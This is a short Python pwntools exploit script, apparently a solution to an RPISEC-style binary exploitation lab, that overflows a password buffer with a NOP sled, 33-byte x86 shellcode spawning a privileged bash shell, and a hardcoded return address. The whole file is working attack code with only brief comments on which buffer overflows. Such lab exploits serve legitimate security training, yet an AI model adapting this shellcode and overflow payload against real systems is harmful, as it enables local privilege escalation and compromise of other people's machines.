from pwn import *

# Local exploit
# SIGTOUT/SIGTINT tty errors on python /tmp/x3C.py. Why?

# when a_user_name[] overflows; illegal seek crash, seek ptr is outside param.
# a_verify_user_pass[] can be overflowed and exploited.

# 33 bytes
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
nop = 0x804a57c

payload = ""
payload += "\x90" * (80-33)
payload += shellcode
payload += p32(nop)

# username
print "rpisec"

# password
print payload


